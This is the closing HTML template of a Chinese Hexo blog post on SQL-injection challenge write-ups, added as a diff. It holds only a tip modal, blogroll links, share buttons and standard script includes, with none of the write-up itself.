class="post-toc-text">这个看起来有点简单！</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#以上的总结"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">以上的总结</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        让这个世界的bug有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.pdsdt.lovepdsdt.com/" target="_blank">Pdsdt</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.starssgo.top/" target="_blank">starssgo</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://phoebe233.cn/" target="_blank">W4nder</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.dongzt.cn/" target="_blank">Alkaid</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://whali3n51.top/" target="_blank">Whali3n51</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.ap1e.cn/" target="_blank">Aple</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://geeeez.github.io/" target="_blank">Geez</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://kkzevip.com/" target="_blank">MoR03r</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.virzz.com/" target="_blank">Virink</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.luoluopeach.top/" target="_blank">Luoluo</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://39.97.247.119/" target="_blank">Vigorous</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.constantine24.com/" target="_blank">Shanks</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.ysllz.com/" target="_blank">ysllz</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Damya &copy; 2018 - 2021
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/一些和sql注入有关的web题wp/&title=《一些和sql注入有关的web题wp》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/一些和sql注入有关的web题wp/&title=《一些和sql注入有关的web题wp》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACuklEQVR42u3aQY6DMAwF0N7/0jPSrEaqCN92Qrt4rCpKwS9Iiev49YqPn7/j/+f34/369TXr+6+v2Xzg4eHhtUJfB5Tc+ur6NT65/9X10SDi4eHhHeNVJ+urh12dWT+xGkNh8cDDw8P7KC9Patdhraf4/Fd4eHh438/L/+/ny0OeyuPh4eF9Gy95TP5tddLvLRubay14eHh4MW+eIj//+fj+Hh4eHl5rV723VOSJbzVFLseJh4eHd4A3KdFWU+EJu1fSxcPDwzvHS1qjroagV4qtFnarrySqVePh4eENeLu2rHqF1HzST+K8eW94eHh4m3h58lpdSCaFhmprQvl/Ax4eHl6Lt6vw2kuRE0yvpIuHh4d3jrcrbV1TJ4tNXoa4eYd4eHh4D/J6m2TVmTlJqfNI8PDw8M7x8q2m3sQ9aR1IfnVzBg8PD+8YL0+Le80EeepcXaJuChx4eHh4B3j55lO1VJFsVvWaBqrNB3h4eHgnePkD5o0FvdDz2MpNV3h4eHhjXrUFqreJtXfqj+6Dh4eHt4mXFEYnZYLqdF8doJt74uHh4R3g7Z2ykyLF/LfV1B8PDw9vL2++qT85cmSzLQwPDw/vQd68QSpP0/ONsbzlCw8PD++zvGpLVnlTv9hYUMDj4eHhHeDl1GQZ6GGqw9dsaMDDw8N7kDdZHvJAq8OUJ9l4eHh4J3jVsmm1wJo8sZpeF+6Jh4eHd4yXh5gXcKsz9q7WKzw8PLxzvF2b/b2mqySNzs/fNF3h4eHhbeL1Jtx5saBals1j6C0neHh4eFXefDHoDUE1Qe8NCh4eHt45Xh5uPii7ts3yosZNrQUPDw/vQ7w8xHmZIF8Moio1Hh4e3uO8dQlgXorNl5lyMQIPDw/vAG9vuPnefW9BKiw5eHh4eAd4zV6t1tBMyrJJAr1hfw8PDw9vdeYXX6RpzqHTivsAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '等你回来呀~';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(つェ⊂)欢迎回来!';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
